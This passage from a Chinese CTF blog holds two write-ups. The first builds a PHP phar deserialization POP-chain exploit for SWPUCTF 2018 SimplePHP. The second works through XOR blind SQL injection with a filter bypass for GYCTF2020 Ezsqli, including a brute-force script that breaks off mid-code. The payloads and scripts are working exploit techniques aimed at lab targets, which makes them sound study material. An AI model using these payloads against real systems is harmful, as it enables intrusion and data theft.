class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file.php?file=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æŸ¥çœ‹æ–‡ä»¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ä¸Šä¼ æ–‡ä»¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--flag is in f1ag.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ç„¶åå°±æ˜¯æ¯ç‡¥çš„ä»£ç å®¡è®¡äº†ã€‚</p><p><code>file.php?file=function.php</code>çœ‹çœ‹æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘</p><p>å¯¹äºåç¼€åè¿›è¡Œäº†é™åˆ¶ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163755044.png" alt="image-20210710163755044"></p><p>å°†æ–‡ä»¶å+IPåœ°å€ç”¨MD5åŠ å¯†å†åŠ ä¸Šjpgï¼Œç§»åŠ¨åˆ°uploadç›®å½•ä¸‹ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163551428-1625906151804.png" alt="image-20210710163551428"></p><p><code>file.php?file=class.php</code></p><p>æ£€æµ‹ç›¸å…³å­—æ ·ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163956441.png" alt="image-20210710163956441"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710164113934.png" alt="image-20210710164113934"></p><p>ä¼¼ä¹æ˜¯æç¤ºï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710164440808.png" alt="image-20210710164440808"></p><p>æ²¡æœ‰<code>unserialize()</code>è°ƒç”¨ï¼Œåˆæœ‰åºåˆ—åŒ–å‡½æ•°ï¼Œè¿˜æœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œå¯çŒœæ˜¯pharé¢˜ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥å¾—æ‰¾popé“¾ã€‚</p><h3 id="æ„é€ popé“¾"><a href="#æ„é€ popé“¾" class="headerlink" title="æ„é€ popé“¾"></a>æ„é€ popé“¾</h3><p>popé“¾æ„é€ é€»è¾‘ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Show</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">C1e4r</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payloadå¦‚ä¸‹ï¼Œè®°å¾—è®¾ç½®php.iniä¸­<code>phar.readonly = Off</code>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//å¯è§¦å‘__toString()</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span> <span class="token comment">//å¯è§¦å‘__get()</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/f1ag.php'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ç”Ÿæˆçš„phar.pharæ”¹æˆå›¾ç‰‡åç¼€ï¼š<code>phar.gif</code>,ä¸Šä¼ </p><p>å…ˆæ ¹æ®ä¹‹å‰æ‰€è¯´çš„æ–‡ä»¶åå­—ç”Ÿæˆè§„åˆ™æ‰¾åˆ°åå­—ï¼Œåé¢è¦åŠ ä¸ª.jpg.</p><pre class="line-numbers language-none"><code class="language-none">521e5ec0fb0fcaa79e19216b5f5342b9.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è²Œä¼¼æ–‡ä»¶ç›®å½•ç›´æ¥å°±å¼€ç€çš„ï¼Œ<code>/upload/</code>å¯ä»¥ç›´æ¥æµè§ˆ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710215959026.png" alt="image-20210710215959026"></p><p>æœ€åæäº¤payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;521e5ec0fb0fcaa79e19216b5f5342b9.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710215013999.png" alt="image-20210710215013999"></p><p>è§£å¯†ä¸€ä¸‹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> Phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GYCTF2020]Ezsqli</title>
      <link href="/p/1354079185.html"/>
      <url>/p/1354079185.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[å­™ç¬‘å·|äºŒåˆ†æ³•å´©æºƒ]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Ezsqli/image-20210709135215391.png" alt="image-20210709135215391"></p><p>å¼€å±€å­™ç¬‘å·ï¼Œæ™¦æ°”ï¼ŒçœŸçš„æ™¦æ°”ã€‚</p><p>è¿™é¢˜è²Œä¼¼åšè¿‡ï¼Œä½†æ˜¯æˆ‘å¿˜äº†</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>æœ‰æ³¨å…¥æ£€æµ‹ï¼Œæ‰€ä»¥å…ˆfuzzä¸€ä¸‹ã€‚</p><p><code>id=sleep</code>ä¸ä¼šè¢«æ£€æµ‹ï¼Œ<code>id=1sleep</code>æ‰ä¼š</p><p>æ£€æµ‹å­—ç¬¦</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Ezsqli/image-20210709152541788.png" alt="image-20210709152541788"></p><p><code>id=1^0</code> =&gt;Nu1L</p><p><code>id=1^1</code> =&gt;Error Occured When Fetch Result.</p><p>å¼‚æˆ–ç›²æ³¨ï¼Œå…ˆç”¨è„šæœ¬è·‘ä¸ªåº“å</p><pre class="line-numbers language-none"><code class="language-none">give_grandpa_pa_pa_pa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹é‡Œçš„é—®é¢˜æ˜¯<code>information_schema.tables</code>è¢«æ£€æµ‹äº†ï¼Œå¯ä»¥æ¢æˆ<code>sys.schema_table_statistics_with_buffer</code></p><p>è·‘å‡ºè¡¨å</p><pre class="line-numbers language-none"><code class="language-none">users233333333333333,f1ag_1s_h3r3_hhhhh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è·‘çš„æ—¶å€™æ‰å‘ç°æŠŠæ•°æ®åº“å<code>give_grandpa_pa_pa_pa</code>ä¹Ÿç»™æ£€æµ‹äº†â€¦â€¦</p><p>å› ä¸º<code>information_schema</code>è¢«æ£€æµ‹äº†ï¼Œä¸èƒ½ç»§ç»­è·‘åˆ—åï¼Œæ‰€ä»¥æ¥ä¸‹æ¥åªèƒ½æ— åˆ—åæ³¨å…¥</p><h3 id="ASCIIåç§»"><a href="#ASCIIåç§»" class="headerlink" title="ASCIIåç§»"></a>ASCIIåç§»</h3><p>å› ä¸ºæ£€æµ‹joinï¼Œæ‰€ä»¥åªèƒ½ç”¨asciiåç§»è·‘</p><pre class="line-numbers language-none"><code class="language-none">select (select &#39;b&#39;) &gt; (select &#39;abcdefg&#39;)#è¿”å›1select (select &#39;b&#39;) &gt; (select &#39;c&#39;)#è¿”å›0select (SELECT &#39;bb&#39;) &gt; (select &#39;ba&#39;)#è¿”å›1select (SELECT 1,&#39;bb&#39;) &gt; (select 1,&#39;ba&#39;)#è¿”å›1select (SELECT 1,&#39;bb&#39;) &gt; (select 2,&#39;ba&#39;)#è¿”å›0select (SELECT &#39;1&#39;) &gt; (select &#39;a&#39;)#è¿”å›0select (SELECT 1) &gt; (select &#39;a&#39;)#è¿”å›1select (SELECT 1) &#x3D; (select &#39;1&#39;)#è¿”å›1select (SELECT 1) &gt; (select &#39;~&#39;)#è¿”å›1select (SELECT &#39;flag&#39;) &gt; (select &#39;f&#39;)#è¿”å›1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ¯”è¾ƒçš„æ—¶å€™ï¼Œ1=â€™1â€™ï¼Œä½†â€™1â€™&lt;â€™aâ€™ï¼Œä¸”1&gt;â€™aâ€™ï¼Œç»æµ‹å¯çŸ¥ï¼Œæ•°å­—&gt;å­—ç¬¦ã€‚</p></blockquote><p>äºæ˜¯æ„é€ payloadï¼Œå…ˆæµ‹å‡º<code>f1ag_1s_h3r3_hhhhh</code>è¡¨çš„åˆ—æ•°</p><pre class="line-numbers language-none"><code class="language-none">1^((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh)) &#x3D;&gt;Error Occured When Fetch Result.1^((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 &#x3D;&gt;Nu1L<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥åˆ—æ•°ä¸º2</p><p>ç„¶åå°±æ˜¯è·‘è„šæœ¬å§ã€‚</p><p>æ— è¯­äº†ï¼ŒæŠ˜è…¾äº†å¥½å‡ ä¸ªå°æ—¶ï¼Œå‘ç°è¿™åˆ°åº•æ²¡æ³•å†™æˆå¹³æ—¶ç”¨çš„äºŒåˆ†æ³•ä»£ç ï¼Œåªèƒ½è€è€å®å®ä¸€ä¸ªä¸€ä¸ªè·‘ã€‚çœŸæ— è¯­äº†ï¼Œæµªè´¹é‚£ä¹ˆå¤šæ—¶é—´ã€‚</p><pre class="line-numbers language-none"><code class="language-none">select (SELECT &#39;flag&#39;) &gt; (select &#39;f&#39;)#è¿™æ˜¯è¿”å›1çš„ï¼ŒäºŒåˆ†è„šæœ¬ä¸­å®šå€¼&gt;å˜é‡å½¢å¼è¦æ±‚è¿™ä¸ªè¿”å›0ï¼Œæ‰€ä»¥æ²¡æ³•æ•´ã€‚æ¢æˆå®šå€¼&lt;å˜é‡å½¢å¼ï¼Œåˆå—ç›²æ³¨é™åˆ¶ï¼Œæ— æ³•æ­£å¸¸ç»“æŸäºŒåˆ†æŸ¥æ‰¾å¾ªç¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># åå…­è¿›åˆ¶è½¬æ¢ fl ==> 0x666cï¼Œå¯ä»¥é¿å…ä¸€äº›å¦‚"fla""è¿™ç§ç¬¦å·é—®é¢˜å¯¼è‡´æ‰§è¡Œé”™è¯¯ä»¥åŠæ£€æµ‹bypass</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> res    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"http://c9046ab0-ea20-4cee-b30d-f37009ba61da.node4.buuoj.cn/"</span>s <span class="token operator">=</span> <span class="token string">""</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> s <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">"1^((1,&#123;0&#125;)>(select * from f1ag_1s_h3r3_hhhhh))^1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b"Nu1L"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            last <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            s <span class="token 